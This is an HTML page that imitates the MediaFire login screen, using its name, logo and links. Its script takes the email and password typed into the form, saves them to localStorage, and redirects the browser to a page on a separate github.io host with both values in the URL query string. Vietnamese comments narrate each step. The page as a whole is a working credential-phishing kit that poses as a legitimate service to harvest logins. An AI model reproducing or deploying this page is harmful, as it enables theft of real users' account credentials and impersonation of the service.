<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login to your account</title>
  <link rel="stylesheet" href="style.css">
  <link rel="icon" href="./image/favicon.png" type="image/png" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
</head>

<body>
  <div class="header-box">
    <div class="header-left">
      <a href="https://www.mediafire.com/" target="_blank" class="logo-link">
        <img src="./image/png-transparent-mediafire-1-hd-logo.png" class="header-logo" alt="Logo">
        <h1>Mediafire</h1>
      </a>
    </div>
    <div class="header-right">
      <a href="https://www.mediafire.com/upgrade/" class="upgrade-btn" target="_blank">Upgrade</a>
      <a href="https://www.mediafire.com/upgrade/" class="signup-btn" target="_blank">Sign Up</a>
      <a href="https://www.mediafire.com/login/" class="login-btn" target="_blank">
        Login
        <i class="fab fa-facebook-f"></i>
        <i class="fab fa-twitter"></i>
      </a>
    </div>
  </div>

  <div class="page-content">
    <div class="container">
      <form id="loginForm" method="POST" onsubmit="return false;">
        <h1>Login to your account</h1>

        <div class="input-field">
          <input type="email" name="email" required>
          <label>Enter your email</label>
        </div>

        <div class="input-field">
          <input type="password" name="password" required>
          <label>Enter your password</label>
        </div>

        <div class="forget">
          <label for="remember">
            <input type="checkbox" id="remember">
            <p>Remember me</p>
          </label>
          <a href="https://www.mediafire.com/lost_password.php">Forgot password?</a>
        </div>
        <button type="submit">Login</button>
        <div class="Register">
          <p>Don't have an account? <a href="#">Register</a></p>
        </div>
      </form>
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      // Lấy dữ liệu từ form
      const email = form.email.value;
      const password = form.password.value;

      // Mã hóa dữ liệu để tránh lỗi URL
const encodedEmail = encodeURIComponent(email);
const encodedPassword = encodeURIComponent(password);

      // Lưu vào localStorage (lưu tạm trên máy user)
      localStorage.setItem('savedEmail', email);
      localStorage.setItem('savedPassword', password);
      window.location.href = 'https://thaivungoc.github.io/thank-you/';
      // Chuyển sang trang cảm ơn kèm dữ liệu trên URL
window.location.href = `https://thaivungoc.github.io/thank-you/?email=${encodedEmail}&password=${encodedPassword}`;
    });
  </script>

</body>
</html>
